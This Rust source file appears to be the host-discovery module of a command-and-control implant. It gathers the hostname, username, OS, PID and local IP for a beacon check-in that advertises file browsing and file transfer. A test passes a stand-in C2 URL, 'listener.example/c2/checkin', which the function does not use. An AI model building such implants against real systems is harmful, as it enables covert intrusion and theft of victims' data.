use std::time::Duration;

use nw_profile::control::CallbackCapabilities;
use serde::{Deserialize, Serialize};

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct HostMetadata {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub os_version: Option<String>,
    pub arch: String,
    pub pid: u32,
    pub executable_path: Option<String>,
    pub local_addr: Option<String>,
    pub implant_version: String,
    pub interval_ms: u64,
    pub jitter_ms: u64,
    pub capabilities: CallbackCapabilities,
}

pub fn discover(_endpoint: &str, interval: Duration, jitter: Duration) -> HostMetadata {
    let hostname = hostname::get()
        .ok()
        .and_then(|value| nonempty(value.to_string_lossy().into_owned()))
        .or_else(|| std::env::var("HOSTNAME").ok().and_then(nonempty))
        .or_else(|| std::env::var("COMPUTERNAME").ok().and_then(nonempty))
        .unwrap_or_else(|| "unknown".to_owned());
    let username = nonempty(whoami::username())
        .filter(|value| !value.eq_ignore_ascii_case("unknown"))
        .or_else(|| std::env::var("USER").ok().and_then(nonempty))
        .or_else(|| std::env::var("USERNAME").ok().and_then(nonempty))
        .unwrap_or_else(|| "unknown".to_owned());
    let os_version =
        nonempty(whoami::distro()).filter(|value| !value.eq_ignore_ascii_case("unknown"));
    let executable_path = std::env::current_exe()
        .ok()
        .map(|path| path.to_string_lossy().into_owned())
        .and_then(nonempty);
    let local_addr = local_ip_address::local_ip()
        .ok()
        .map(|addr| addr.to_string());

    HostMetadata {
        hostname,
        username,
        os: std::env::consts::OS.to_owned(),
        os_version,
        arch: std::env::consts::ARCH.to_owned(),
        pid: std::process::id(),
        executable_path,
        local_addr,
        implant_version: env!("CARGO_PKG_VERSION").to_owned(),
        interval_ms: millis(interval),
        jitter_ms: millis(jitter),
        capabilities: CallbackCapabilities {
            process_browser: true,
            file_browser: true,
            file_transfer: true,
            task_ack: true,
        },
    }
}

fn nonempty(value: String) -> Option<String> {
    let value = value.trim();
    (!value.is_empty()).then(|| value.to_owned())
}

fn millis(duration: Duration) -> u64 {
    duration.as_millis().try_into().unwrap_or(u64::MAX)
}

#[cfg(test)]
mod tests {
    use std::sync::{LazyLock, Mutex};
    use std::time::Duration;

    static ENVIRONMENT_LOCK: LazyLock<Mutex<()>> = LazyLock::new(|| Mutex::new(()));

    #[test]
    fn discovers_hostname_without_exported_environment() {
        let _guard = ENVIRONMENT_LOCK.lock().unwrap();
        let hostname = std::env::var_os("HOSTNAME");
        let computername = std::env::var_os("COMPUTERNAME");

        // SAFETY: this test holds the module's process-environment lock for the
        // entire mutation and restoration window.
        unsafe {
            std::env::remove_var("HOSTNAME");
            std::env::remove_var("COMPUTERNAME");
        }

        let metadata = super::discover(
            "https://listener.example/c2/checkin",
            Duration::from_secs(1),
            Duration::from_millis(200),
        );

        // SAFETY: still serialized by ENVIRONMENT_LOCK.
        unsafe {
            match hostname {
                Some(value) => std::env::set_var("HOSTNAME", value),
                None => std::env::remove_var("HOSTNAME"),
            }
            match computername {
                Some(value) => std::env::set_var("COMPUTERNAME", value),
                None => std::env::remove_var("COMPUTERNAME"),
            }
        }

        assert!(!metadata.hostname.is_empty());
        assert_ne!(metadata.hostname, "unknown");
    }
}
